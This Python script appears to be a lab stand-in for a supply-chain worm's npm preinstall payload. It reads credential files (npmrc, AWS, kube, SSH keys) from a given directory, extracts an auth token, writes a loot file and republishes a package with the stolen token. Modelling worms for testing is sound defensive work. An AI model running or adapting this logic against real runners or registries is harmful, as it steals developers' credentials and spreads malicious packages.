#!/usr/bin/env python3
"""Stand-in for the ChainDrop worm's install-time payload.

This is NOT malware. It models, in a few lines, the three actions the real Mini Shai-Hulud
variant performs from an npm preinstall hook: harvest credentials from the runner, write the
loot somewhere it can be picked up, and use a harvested token to republish a package. Every
target path is passed in by the harness, so nothing here is usable outside the lab.

Environment:
  REGISTRY_URL   base URL the infected runner would publish to
  CRED_DIR       directory holding the runner's credential files (npmrc, aws, kube, ssh)
  EXFIL_DIR      directory the worm tries to write loot to
Output: one JSON line describing what it managed to do.
"""
import glob, json, os, urllib.request

REG = os.environ.get("REGISTRY_URL", "http://127.0.0.1:18100")
CRED = os.environ.get("CRED_DIR", "")
EXFIL = os.environ.get("EXFIL_DIR", "")
PKG = os.environ.get("PKG", "@acme/leftpad")

result = {"pkg": PKG, "read": [], "exfil": "no", "publish": "no", "token": None}

# 1. harvest credentials from the runner
for pat in ("npmrc", "npm_token", "aws_credentials", "kube_config", "id_rsa", "gcloud"):
    for p in glob.glob(os.path.join(CRED, f"*{pat}*")):
        try:
            text = open(p).read()
            result["read"].append(os.path.basename(p))
            for line in text.splitlines():
                if "token" in line.lower() or "_authToken" in line:
                    result["token"] = line.replace("_authToken", "").split("=")[-1].strip()
        except Exception as e:
            result["read"].append(f"{os.path.basename(p)}:{type(e).__name__}")
        if result["token"]:
            break

# 2. exfiltrate
try:
    os.makedirs(EXFIL, exist_ok=True)
    with open(os.path.join(EXFIL, "loot.txt"), "w") as f:
        f.write(",".join(result["read"]))
    result["exfil"] = "yes"
except Exception as e:
    result["exfil"] = f"ERR:{type(e).__name__}"

# 3. republish with the harvested token (the self-propagation step)
if result["token"]:
    try:
        url = f"{REG}/publish?token={result['token']}&name=@acme/core&version=9.9.9-worm"
        body = json.load(urllib.request.urlopen(url, timeout=5))
        result["publish"] = body.get("published") or body.get("error", "?")
        result["publish_tag"] = body.get("tag")
    except Exception as e:
        result["publish"] = f"ERR:{type(e).__name__}"

print(json.dumps(result))